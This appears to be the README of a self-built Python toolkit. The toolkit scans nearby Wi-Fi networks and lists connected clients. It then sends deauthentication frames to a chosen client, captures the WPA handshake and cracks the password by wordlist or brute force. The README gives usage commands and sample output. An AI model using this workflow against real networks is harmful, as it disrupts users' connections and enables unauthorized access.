## Overview
This project is a custom-built, semi-automated toolkit for identifying nearby Wi-Fi networks and performing a targeted deauthentication attack on connected clients. It's modeled after tools like airodump-ng and aireplay-ng, but with your own Python code (using Scapy and subprocess) orchestrating the workflow.


## Workflow

1. Scan for nearby Wi-Fi Access Points (APs)

2. Extract BSSID, ESSID, and Channel information

3. Scan for connected clients on a selected AP

4. Perform a targeted deauthentication attack against a chosen client. Capture the resulting handshake passively 

5. Take passwords from a provided wordlist or bruteforce them. Match the computed MIC from guessed password and handshake fields with the MIC extracted from handshake frames.


## Pre-requisits
1. have a netword card with monitor mode support
2. install airodump-ng
```
sudo apt update
sudo apt install aircrack-ng
```

## Usage
run automate-scan.py
```
$ python3 automate-scan.py
```
It will scan and list all available WiFi networks. When prompted, input the name of the network you want to attack.
Then all the clients connected on that network will be listed. Select the index of the client you want to perform the deauthentication attack.
You will see an output line like this
```
[🛑] Suggested Deauth Command:
sudo ./venv/bin/python3 custom-deauth.py <AP_MAC> <Client_MAC> <interface> <count>
```
Copy this command and run in another terminal.
When that client is successfully disconnected and reconnected, stop frame capturing on the automate-scan.py. The final capture will be saved to "deauth-capture-01.cap". 
To crack password using wordlist
```
$ python3 wpa_cracker.py deauth-capture-01.cap --passlist_file <custom-wordlist-file>
```
To crack password using bruteforce
```
$ python3 wpa_cracker.py deauth-capture-01.cap --bruteforce --min_len 8 --max_len 10
```
You will see output like this
```
[*] Starting password cracking...
[-] Tried: 12341234
[-] Tried: 12345678
[-] Tried: 123432344443
[-] Tried: jkdhgfdskjh
[-] Tried: mvnxnvnhfkgvjhskjhj
[-] Tried: jhchxh
[✓] Password found: supersecretpassword
```